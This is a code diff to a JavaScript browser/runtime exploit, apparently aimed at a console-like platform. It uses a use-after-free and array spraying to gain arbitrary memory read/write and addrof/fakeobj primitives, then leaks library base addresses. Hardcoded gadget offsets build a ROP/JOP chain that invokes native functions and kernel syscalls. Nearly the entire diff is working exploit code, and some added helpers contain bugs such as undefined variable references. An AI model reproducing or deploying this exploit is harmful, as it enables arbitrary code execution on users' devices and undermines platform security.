@@ -17,14 +17,26 @@ class BigInt {
       case 0:
         break
       case 1:
-        var [val] = arguments
+        var val = arguments[0]
         switch (typeof val) {
+          case 'boolean':
+            this.u8[0] = (val === true) | 0
+            break
           case 'number':
-            if (Number.isNaN(val)) {
+            if (isNaN(val)) {
               throw new TypeError(`value ${val} is NaN`)
             }
 
-            this.f64[0] = val
+            if (Number.isInteger(val)) {
+              if (!Number.isSafeInteger(val)) {
+                throw new RangeError(`Integer ${val} outside safe 53-bit range`)
+              }
+
+              this.u32[0] = val
+              this.u32[1] = val / 0x100000000
+            } else {
+              this.f64[0] = val
+            }
 
             break
           case 'string':
@@ -71,7 +83,8 @@ class BigInt {
         }
         break
       case 2:
-        var [hi, lo] = arguments
+        var hi = arguments[0]
+        var lo = arguments[1]
 
         if (!Number.isInteger(hi)) {
           throw new RangeError(`hi value ${hi} is not an integer !!`)
@@ -79,6 +92,13 @@ class BigInt {
 
         if (!Number.isInteger(lo)) {
           throw new RangeError(`lo value ${lo} is not an integer !!`)
+        }
+
+        if (hi < 0 || hi > 0xFFFFFFFF) {
+          throw new RangeError(`hi value ${hi} is out of 32-bit range !!`)
+        }
+        if (lo < 0 || lo > 0xFFFFFFFF) {
+          throw new RangeError(`lo value ${lo} is out of 32-bit range !!`)
         }
 
         this.u32[0] = lo
@@ -89,12 +109,29 @@ class BigInt {
     }
   }
 
+  valueOf () {
+    var hi = this.hi()
+    var lo = this.lo()
+    
+    if (hi <= 0x1FFFFF) {
+      return hi * 0x100000000 + lo
+    }
+
+    var f = this.f64[0]
+    if (!isNaN(val)) {
+      return f
+    }
+
+    throw new RangeError(`Unable to convert ${this} to primitive`)
+  }
+
   toString () {
     var val = '0x'
     for (var i = this.u8.length - 1; i >= 0; i--) {
       var c = this.u8[i].toString(16).toUpperCase()
       val += c.length === 1 ? '0' + c : c
     }
+
     return val
   }
 
@@ -131,6 +168,8 @@ class BigInt {
   }
 
   cmp (val) {
+    val = val instanceof BigInt ? val : new BigInt(val)
+
     if (this.hi() > val.hi()) {
       return 1
     }
@@ -151,10 +190,14 @@ class BigInt {
   }
 
   eq (val) {
-    return this.hi() === val.hi() && this.lo() === val.lo() 
+    val = val instanceof BigInt ? val : new BigInt(val)
+    
+    return this.hi() === val.hi() && this.lo() === val.lo()
   }
 
   neq (val) {
+    val = val instanceof BigInt ? val : new BigInt(val)
+
     return this.hi() !== val.hi() || this.lo() !== val.lo()
   }
 
@@ -175,6 +218,8 @@ class BigInt {
   }
 
   add (val) {
+    val = val instanceof BigInt ? val : new BigInt(val)
+
     var ret = new BigInt()
 
     var c = 0
@@ -184,10 +229,16 @@ class BigInt {
       ret.u8[i] = b
     }
 
+    if (c !== 0) {
+      throw new Error('add overflowed !!');
+    }
+
     return ret
   }
 
   sub (val) {
+    val = val instanceof BigInt ? val : new BigInt(val)
+
     var ret = new BigInt()
 
     var c = 0
@@ -197,10 +248,16 @@ class BigInt {
       ret.u8[i] = b
     }
 
+    if (c !== 0) {
+      throw new Error('sub underflowed !!');
+    }
+
     return ret
   }
 
   mul (val) {
+    val = val instanceof BigInt ? val : new BigInt(val)
+
     var ret = new BigInt()
 
     var c = 0
@@ -215,15 +272,17 @@ class BigInt {
     }
 
     if (c !== 0) {
-      throw new Error("mul overflowed !!")
+      throw new Error('mul overflowed !!')
     }
 
     return ret
   }
 
   divmod (val) {
+    val = val instanceof BigInt ? val : new BigInt(val)
+
     if (!val.gte(BigInt.Zero)) {
-      throw new Error("Division by zero")
+      throw new Error('Division by zero')
     }
 
     var q = new BigInt()
@@ -244,7 +303,7 @@ class BigInt {
       }
     }
 
-    return { q: q, r: r }
+    return { q, r }
   }
 
   div (val) {
@@ -256,6 +315,8 @@ class BigInt {
   }
 
   xor (val) {
+    val = val instanceof BigInt ? val : new BigInt(val)
+
     var ret = new BigInt()
 
     for (var i = 0; i < this.buf.byteLength; i++) {
@@ -266,6 +327,8 @@ class BigInt {
   }
 
   and (val) {
+    val = val instanceof BigInt ? val : new BigInt(val)
+    
     var ret = new BigInt()
 
     for (var i = 0; i < this.buf.byteLength; i++) {
@@ -275,7 +338,21 @@ class BigInt {
     return ret
   }
 
+  or (val) {
+    val = val instanceof BigInt ? val : new BigInt(val)
+
+    var ret = new BigInt()
+
+    for (var i = 0; i < this.buf.byteLength; i++) {
+      ret.u8[i] = this.u8[i] | val.u8[i]
+    }
+
+    return ret
+  }
+
   neg () {
+    val = val instanceof BigInt ? val : new BigInt(val)
+
     var ret = new BigInt()
 
     for (var i = 0; i < this.buf.byteLength; i++) {
@@ -337,7 +414,7 @@ class BigInt {
 }
 
 BigInt.Zero = new BigInt()
-BigInt.One = new BigInt(0, 1)
+BigInt.One = new BigInt(1)
 BigInt.TYPE_MAP = {
   Int8Array: 'i8',
   Uint8Array: 'u8',
@@ -349,28 +426,26 @@ BigInt.TYPE_MAP = {
   Float64Array: 'f64',
 }
 
-function make_uaf(arr) {
-    var o = {}
-    for (var i in {xx: ""}) {
-        for (i of [arr]) {}
-        o[i]
-    }
-
-    gc()
+function make_uaf (arr) {
+  var o = {}
+  for (var i in {xx: ''}) {
+    for (i of [arr]) {}
+    o[i]
+  }
 }
 
-// needed for rw primitives
+// needed for arw
 var prim_uaf_idx = -1
 var prim_spray_idx = -1
 var prim_marker = new BigInt(0x13371337, 0x13371337) // used to find sprayed array
 
-// store Uint32Array structure ids to be used for fake master id later 
+// store Uint32Array structure ids to be used for fake master id later
 var structs = new Array(0x100)
 
-// used for rw primitives
+// used for arw
 var master, slave
 
-// rw primitive leak addresses 
+// arw leak addresses
 var leak_obj, leak_obj_addr, master_addr
 
 // spray Uint32Array structure ids
@@ -379,25 +454,25 @@ for (var i = 0; i < structs.length; i++) {
   structs[i][`spray_${i}`] = 0x1337
 }
 
-log("Intiate UAF...")
+log('Initiate UAF...')
 
-var uaf_arr = new Uint32Array(0x80000)
+var uaf_arr = new Uint32Array(0x40000)
 
 // fake m_hashAndFlags
-uaf_arr[4] = 0xB0 
+uaf_arr[4] = 0xB0
 
 make_uaf(uaf_arr)
 
-log("Achieved UAF !!")
+log('Achieved UAF !!')
 
-log("Spraying arrays with marker...")
+log('Spraying arrays with marker...')
 // spray candidates arrays to be used as leak primitive
-var spray = new Array(0x1000)
+var spray = new Array(0x400)
 for (var i = 0; i < spray.length; i++) {
-    spray[i] = [prim_marker.jsv(), {}]
+    spray[i] = [prim_marker.jsv(), {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}]
 }
 
-log("Looking for marked array...")
+log('Looking for marked array...')
 // find sprayed candidate by marker then corrupt its length 
 for (var i = 0; i < uaf_arr.length; i += 2) {
   var val = new BigInt(uaf_arr[i + 1], uaf_arr[i])
@@ -406,9 +481,9 @@ for (var i = 0; i < uaf_arr.length; i += 2) {
 
     prim_uaf_idx = i - 2
 
-    log (`Marked array length ${new BigInt(0, uaf_arr[prim_uaf_idx])}`)
+    log(`Marked array length ${new BigInt(uaf_arr[prim_uaf_idx])}`)
 
-    log("Corrupting marked array length...")
+    log('Corrupting marked array length...')
     // corrupt indexing header
     uaf_arr[prim_uaf_idx] = 0x1337
     uaf_arr[prim_uaf_idx + 1] = 0x1337
@@ -417,14 +492,14 @@ for (var i = 0; i < uaf_arr.length; i += 2) {
 }
 
 if (prim_uaf_idx === -1) {
-  throw new Error("Failed to find marked array !!")
+  throw new Error('Failed to find marked array !!')
 }
 
 // find index of corrupted array
 for (var i = 0; i < spray.length; i++) {
   if (spray[i].length === 0x1337) {
     log(`Found corrupted array at spray[${i}] !!`)
-    log(`Corrupted array length ${new BigInt(0, spray[i].length)}`)
+    log(`Corrupted array length ${new BigInt(spray[i].length)}`)
 
     prim_spray_idx = i
     break
@@ -432,10 +507,10 @@ for (var i = 0; i < spray.length; i++) {
 }
 
 if (prim_spray_idx === -1) {
-    throw new Error("Failed to find corrupted array !!")
+  throw new Error('Failed to find corrupted array !!')
 }
 
-log("Intiate RW primitives...")
+log('Initiate ARW...')
 
 var prim_uaf_obj_idx = prim_uaf_idx + 4
 
@@ -443,7 +518,7 @@ slave = new Uint32Array(0x1000)
 slave[0] = 0x13371337
 
 // leak address of leak_obj
-leak_obj = {a: slave, b: 0, c: 0, d: 0}
+leak_obj = { obj: slave }
 
 spray[prim_spray_idx][1] = leak_obj
 
@@ -452,18 +527,18 @@ leak_obj_addr = new BigInt(uaf_arr[prim_uaf_obj_idx + 1], uaf_arr[prim_uaf_obj_i
 // try faking Uint32Array master by incremental structure_id until it matches from one of sprayed earlier in structs array
 var structure_id = 0x80
 while (!(master instanceof Uint32Array)) {
-  var rw_obj = { 
-    js_cell: new BigInt(0x1182300, structure_id++).jsv(), 
-    butterfly: 0, 
-    vector: slave, 
-    length_and_flags: 0x1337 
+  var rw_obj = {
+    js_cell: new BigInt(0x1182300, structure_id++).jsv(),
+    butterfly: 0,
+    vector: slave,
+    length_and_flags: 0x1337
   }
 
   spray[prim_spray_idx][1] = rw_obj
 
   var rw_obj_addr = new BigInt(uaf_arr[prim_uaf_obj_idx + 1], uaf_arr[prim_uaf_obj_idx])
 
-  rw_obj_addr = rw_obj_addr.add(new BigInt(0, 0x10))
+  rw_obj_addr = rw_obj_addr.add(0x10)
 
   uaf_arr[prim_uaf_obj_idx] = rw_obj_addr.lo()
   uaf_arr[prim_uaf_obj_idx + 1] = rw_obj_addr.hi()
@@ -473,11 +548,11 @@ while (!(master instanceof Uint32Array)) {
 
 master_addr = new BigInt(master[5], master[4])
 
-log("Achieved RW primitives !!")
-log(`master_addr: ${master_addr}`)
+debug(`master_addr: ${master_addr}`)
+log('Achieved ARW !!')
 
-// rw primitive
-var prim = {
+var mem = {
+  allocs: new Map(),
   read8: function (addr) {
     master[4] = addr.lo()
     master[5] = addr.hi()
@@ -487,7 +562,7 @@ var prim = {
   read4: function (addr) {
     master[4] = addr.lo()
     master[5] = addr.hi()
-    var retval = new BigInt(0, slave[0])
+    var retval = new BigInt(slave[0])
     return retval
   },
   write8: function (addr, val) {
@@ -507,71 +582,435 @@ var prim = {
     slave[0] = val
   },
   addrof: function (obj) {
-    leak_obj.a = obj
-    return prim.read8(leak_obj_addr.add(new BigInt(0, 0x10)))
+    leak_obj.obj = obj
+    return mem.read8(leak_obj_addr.add(0x10))
   },
+  fakeobj: function (addr) {
+    mem.write8(leak_obj_addr.add(0x10), addr)
+    return leak_obj.obj
+  },
+  malloc: function (count) {
+    var buf = new Uint8Array(count)
+    var backing = mem.backing(buf)
+    mem.allocs.set(backing, buf)
+    return backing
+  },
+  free: function (addr) {
+    if (mem.allocs.has(addr)) {
+      mem.allocs.delete(addr)
+    }
+  },
+  base_addr(func_addr) {
+    var module_info_addr = mem.malloc(0x130)
+
+    mem.write8(module_info_addr, new BigInt(0x130))
+
+    if (!fn.sceKernelGetModuleInfoForUnwind(func_addr, BigInt.One, module_info_addr).eq(BigInt.Zero)) {
+      throw new Error(`Unable to get ${func_addr} base addr`)
+    }
+
+    var base_addr = mem.read8(module_info_addr.add(0x120))
+
+    mem.free(module_info_addr)
+
+    return base_addr
+  },
+  free_all () {
+    mem.allocs.clear()
+  },
+  str: function (addr) {
+    var chars = []
+
+    var term = false
+    var offset = new BigInt()
+    while (!term) {
+      var val = mem.read8(addr.add(offset))
+      for (var i = 0; i < val.u8.length; i++) {
+        var c = val.u8[i]
+        if (c === 0) {
+          term = true
+          break
+        }
+
+        chars.push(c)
+      }
+
+      offset = offset.add(8)
+    }
+
+    return String.fromCharCode(chars)
+  },
+  cstr: function (str) {
+    var bytes = new Uint8Array(str.length + 1)
+
+    for (var i = 0; i < str.length; i++) {
+      bytes[i] = str.charCodeAt(i) & 0xFF
+    }
+
+    bytes[str.length] = 0
+
+    var backing = mem.backing(bytes)
+    mem.allocs.set(backing, bytes)
+    return backing
+  },
+  backing (buf) {
+    return mem.read8(mem.addrof(buf).add(0x10))
+  }
 }
 
-/*
-var test = {
-  a: 13.37
+var math_min_addr = mem.addrof(Math.min)
+debug(`addrof(Math.min): ${math_min_addr}`)
+
+var class_info = mem.read8(math_min_addr.add(0x10))
+debug(`class_info: ${class_info}`)
+
+var native_executable = mem.read8(math_min_addr.add(0x18))
+debug(`native_executable: ${native_executable}`)
+
+var native_executable_function = mem.read8(native_executable.add(0x40))
+debug(`native_executable_function: ${native_executable_function}`)
+
+var native_executable_constructor = mem.read8(native_executable.add(0x48))
+debug(`native_executable_constructor: ${native_executable_constructor}`)
+
+var jsc_addr = native_executable_function.sub(0xC6380)
+
+var _error_addr = mem.read8(jsc_addr.add(0x1E72398))
+debug(`_error_addr: ${_error_addr}`)
+
+var strerror_addr = mem.read8(jsc_addr.add(0x1E723B8))
+debug(`strerror_addr: ${strerror_addr}`)
+
+var libc_addr = strerror_addr.sub(0x40410)
+
+var jsmaf_gc_addr = mem.addrof(jsmaf.gc)
+debug(`addrof(jsmaf.gc): ${jsmaf_gc_addr}`)
+
+var native_invoke_addr = mem.read8(jsmaf_gc_addr.add(0x18))
+debug(`native_invoke_addr: ${native_invoke_addr}`)
+
+var eboot_addr = native_invoke_addr.sub(0x39330)
+
+var gadgets = {
+  RET: jsc_addr.add(0x4C),
+  POP_R10_RET: jsc_addr.add(0x19E297C),
+  POP_R12_RET: jsc_addr.add(0x3F3231),
+  POP_R14_RET: jsc_addr.add(0x15BE0A),
+  POP_R15_RET: jsc_addr.add(0x93CD7),
+  POP_R8_RET: jsc_addr.add(0x19BFF1),
+  POP_R9_JO_RET: jsc_addr.add(0x72277C),
+  POP_RAX_RET: jsc_addr.add(0x54094),
+  POP_RBP_RET: jsc_addr.add(0xC7),
+  POP_RBX_RET: jsc_addr.add(0x9D314),
+  POP_RCX_RET: jsc_addr.add(0x2C3DF3),
+  POP_RDI_RET: jsc_addr.add(0x93CD8),
+  POP_RDX_RET: jsc_addr.add(0x3A3DA2),
+  POP_RSI_RET: jsc_addr.add(0xCFEFE),
+  POP_RSP_RET: jsc_addr.add(0xC89EE),
+  LEAVE_RET: jsc_addr.add(0x50C33),
+  MOV_RAX_QWORD_PTR_RDI_RET: jsc_addr.add(0x36073),
+  MOV_QWORD_PTR_RDI_RAX_RET: jsc_addr.add(0x27FD0), 
+  MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40: jsc_addr.add(0x46E8F0),
+  PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18: jsc_addr.add(0x3F6F70),
+  MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: jsc_addr.add(0x18B3B5),
+  PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22: jsc_addr.add(0x1E25AA1),
+  PUSH_RBP_POP_RCX_RET: jsc_addr.add(0x1737EEE),
+  MOV_RAX_RCX_RET: jsc_addr.add(0x41015),
+  PUSH_RAX_POP_RBP_RET: jsc_addr.add(0x4E82B9)
 }
 
-log(`test: ${test}`)
-log(`test.a: ${test.a}`)
+var rop = {
+  idx: 0,
+  base: 0x2500,
+  jop_stack_store: undefined,
+  jop_stack_addr: undefined,
+  stack_addr: undefined,
+  fake: undefined,
+  init: function () {
+    log('Initiate ROP...')
 
-var addr = prim.leakval(test)
-log(`test addrof: ${addr}`)
+    rop.jop_stack_store = mem.malloc(8)
+    rop.jop_stack_addr = mem.malloc(0x6A)
+    rop.stack_addr = mem.malloc(rop.base * 2)
 
-var a = addr.add(new BigInt(0, 0x10))
+    var jop_stack_base_addr = rop.jop_stack_addr.add(0x22)
 
-var val = prim.read8(a)
-log(`addrof(test)+0x10 read8: ${val}`)
-log(`addrof(test)+0x10 read8 double: ${val.d()}`)
+    mem.write8(rop.jop_stack_addr, gadgets.POP_RSP_RET)
+    mem.write8(jop_stack_base_addr, rop.stack_addr.add(rop.base))
+    mem.write8(jop_stack_base_addr.add(0x10), gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22)
+    mem.write8(jop_stack_base_addr.add(0x18), gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10)
+    mem.write8(jop_stack_base_addr.add(0x40), gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18)
 
-val = new BigInt(1.1)
-log(`addrof(test)+0x10 write8: ${val}`)
-prim.write8(a, val)
+    mem.write8(rop.jop_stack_store, jop_stack_base_addr)
 
-val = prim.read8(a)
-log(`addrof(test)+0x10 read8: ${val}`)
-log(`addrof(test)+0x10 read8 double: ${val.d()}`)
-*/
+    rop.fake = rop.fake_builtin(gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40)
+    rop.reset()
 
-var math_min_addr = prim.addrof(Math.min)
-log(`addrof(Math.min): ${math_min_addr}`)
+    log('Achieved ROP !!')
+  },
+  free: function () {
+    mem.free(rop.fake.executable)
+    mem.free(rop.jop_stack_store)
+    mem.free(rop.jop_stack_addr)
+  },
+  reset: function () {
+    rop.idx = rop.base
+  },
+  push: function (val) {
+    if (rop.idx > rop.base * 2) {
+      throw new Error('Stack full !!')
+    }
 
-var native_executable = prim.read8(math_min_addr.add(new BigInt(0, 0x18)))
-log(`native_executable: ${native_executable}`)
+    mem.write8(rop.stack_addr.add(rop.idx), val)
+    rop.idx += 8
+  },
+  execute: function (insts, store_addr, store_size) {
+    if (store_size % 8 !== 0) {
+      throw new Error('Invalid store, not aligned by 8 bytes')
+    }
 
-var native_executable_function = prim.read8(native_executable.add(new BigInt(0, 0x40)))
-log(`native_executable_function: ${native_executable_function}`)
+    if (store_size < 8) {
+      throw new Error('Invalid store, minimal size is 8 to store RSP')
+    }
 
-var native_executable_constructor = prim.read8(native_executable.add(new BigInt(0, 0x48)))
-log(`native_executable_constructor: ${native_executable_constructor}`)
+    var header = []
 
-var base_addr = native_executable_function.sub(new BigInt(0, 0xC6380))
+    header.push(gadgets.PUSH_RBP_POP_RCX_RET)
+    header.push(gadgets.MOV_RAX_RCX_RET)
+    rop.store(header, store_addr, 0)
 
-var _error_addr = prim.read8(base_addr.add(new BigInt(0, 0x1E72398)))
-log(`_error_addr: ${_error_addr}`)
+    var footer = []
 
-var strerror_addr = prim.read8(base_addr.add(new BigInt(0, 0x1E723B8)))
-log(`strerror_addr: ${strerror_addr}`)
+    rop.load(footer, store_addr, 0)
+    footer.push(gadgets.PUSH_RAX_POP_RBP_RET)
+    footer.push(gadgets.POP_RAX_RET)
+    footer.push(BigInt.Zero)
+    footer.push(gadgets.LEAVE_RET)
 
-var libc_addr = strerror_addr.sub(new BigInt(0, 0x40410))
+    insts = header.concat(insts).concat(footer)
 
-var jsmaf_gc_addr = prim.addrof(jsmaf.gc)
-log(`addrof(jsmaf.gc): ${jsmaf_gc_addr}`)
+    for (var inst of insts) {
+      rop.push(inst)
+    }
 
-var jsmaf_gc_native_addr = prim.read8(jsmaf_gc_addr.add(new BigInt(0, 0x18)))
-log(`jsmaf_gc_native_addr: ${jsmaf_gc_native_addr}`)
+    rop.fake(0, 0, 0, mem.fakeobj(rop.jop_stack_store))
 
-var eboot_addr = jsmaf_gc_native_addr.sub(new BigInt(0, 0x39330))
+    rop.reset()
+  },
+  fake_builtin: function (addr) {
+    function fake () {}
 
-log(`base_addr: ${base_addr}`)
-log(`libc_addr: ${libc_addr}`)
-log(`eboot_addr: ${eboot_addr}`)
+    var fake_native_executable = mem.malloc(0x60)
+    debug(`fake_native_executable: ${fake_native_executable}`)
 
-// prim.write8(native_executable.add(new BigInt(0, 0x40)), new BigInt(0x41414141, 0x41414141))
+    for (var i = 0; i < 0x60; i += 8) {
+      var val = mem.read8(native_executable.add(i))
+      mem.write8(fake_native_executable.add(i), val)
+    }
 
-// Math.min(BigInt.One.d())
+    mem.write8(fake_native_executable.add(0x40), addr)
+
+    var fake_addr = mem.addrof(fake)
+    debug(`addrof(fake): ${fake_addr}`)
+
+    mem.write8(fake_addr.add(0x10), class_info)
+    mem.write8(fake_addr.add(0x18), fake_native_executable)
+
+    fake.executable = fake_native_executable
+
+    return fake
+  },
+  store (insts, addr, index) {
+    insts.push(gadgets.POP_RDI_RET)
+    insts.push(addr.add(index * 8))
+    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
+  },
+  load (insts, addr, index) {
+    insts.push(gadgets.POP_RDI_RET)
+    insts.push(addr.add(index * 8))
+    insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET)
+  }
+}
+
+var fn = {
+  register: function (input, name, ret) {
+    if (name in this) {
+      throw new Error(`${name} already registered in fn !!`)
+    }
+
+    var id
+    var addr
+    var syscall = false
+    if (input instanceof BigInt) {
+      addr = input
+    } else if (typeof input === 'number') {
+      if (!syscalls.map.has(input)) {
+        throw new Error(`Syscall id ${input} not found !!`)
+      }
+
+      id = new BigInt(input)
+      addr = syscalls.map.get(input)
+      syscall = true
+    } 
+
+    var f = function () {
+      if (arguments.length > 6) {
+        throw new Error('More than 6 arguments is not supported !!')
+      }
+
+      var ctx = []
+      var insts = []
+
+      var regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]
+
+      insts.push(gadgets.POP_RAX_RET)
+      insts.push(syscall ? id : BigInt.Zero)
+
+      for (var i = 0; i < arguments.length; i++) {
+        var reg = regs[i]
+        var value = arguments[i]
+
+        insts.push(reg)
+
+        switch (typeof value) {
+          case 'boolean':
+            value = new BigInt(value)
+            break
+          case 'string':
+            value = mem.cstr(value)
+            ctx.push(value)
+            break
+          default:
+            if (!(value instanceof BigInt)) {
+              throw new Error(`Invalid value at arg ${i}`)
+            }
+            break
+        }
+
+        insts.push(value)
+      }
+
+      insts.push(addr)
+
+      var store_size = ret ? 0x10 : 8
+      var store_addr = mem.malloc(store_size)
+
+      if (ret) {
+        rop.store(insts, store_addr, 1)
+      }
+
+      rop.execute(insts, store_addr, store_size)
+
+      while (ctx.length > 0) {
+        mem.free(ctx.pop())
+      }
+
+      var result
+      if (ret) {
+        result = mem.read8(store_addr.add(8))
+
+        if (syscall) {
+          if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
+            mem.free(store_addr)
+
+            var errno_addr = fn._error()
+            var errno = mem.read4(errno_addr)
+            var str = fn.strerror(errno)
+
+            throw new Error(`${name} returned errno ${errno}: ${str}`)
+          }
+        }
+
+        switch(ret) {
+            case 'bigint':
+              break
+            case 'boolean':
+              result = result.eq(BigInt.One)
+              break
+            case 'string':
+              result = mem.str(result)
+              break
+            default:
+              throw new Error(`Unsupported return type ${ret}`)
+          }
+      }
+
+      mem.free(store_addr)
+
+      return result
+    }
+
+    Object.defineProperty(f, 'addr', { value: addr })
+
+    fn[name] = f
+  },
+  unregister (name) {
+    if (!(name in this)) {
+      log(`${name} not registered in fn !!`)
+      return false
+    }
+
+    delete fn[name]
+
+    return true
+  }
+}
+
+rop.init()
+
+fn.register(libc_addr.add(0x5F0), 'sceKernelGetModuleInfoForUnwind', 'bigint')
+
+var libkernel_addr = mem.base_addr(_error_addr)
+
+log(`jsc address: ${jsc_addr}`)
+log(`libc address: ${libc_addr}`)
+log(`libkernel address: ${libkernel_addr}`)
+log(`eboot address: ${eboot_addr}`)
+
+var syscalls = {
+  pattern: [0x48, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x49, 0x89, 0xCA, 0x0F, 0x05],
+  map: new Map(),
+  init: function (addr) {
+    var offset = 0
+    var count = 0x40000
+    
+    var start_offset = 0
+    var pattern_idx = 0
+    while (offset < count) {
+      var val = mem.read8(addr.add(offset))
+      for (var i = 0; i < val.u8.length; i++) {
+        var b = val.u8[i]
+        var c = syscalls.pattern[pattern_idx]
+        if (b === c || (c === 0xFF && b < c)) {
+          if (pattern_idx === 0) {
+            start_offset = offset
+          } else if (pattern_idx === syscalls.pattern.length - 1) {
+            var match = mem.read8(addr.add(start_offset))
+
+            var id = match.shl(8).hi()
+
+            syscalls.map.set(id, new BigInt(start_offset))
+
+            pattern_idx = 0
+            continue
+          }
+
+          pattern_idx++
+        } else {
+          pattern_idx = 0
+        }
+
+        offset++
+      }
+    }
+  }
+}
+
+syscalls.init(libkernel_addr)
+
+debug(`Found ${syscalls.map.size} syscalls`)
+
+fn.register(_error_addr, '_error', 'bigint')
+fn.register(strerror_addr, 'strerror', 'string')
+fn.register(0x14, 'getpid', 'bigint')
+fn.register(0x29, 'dup', 'bigint')
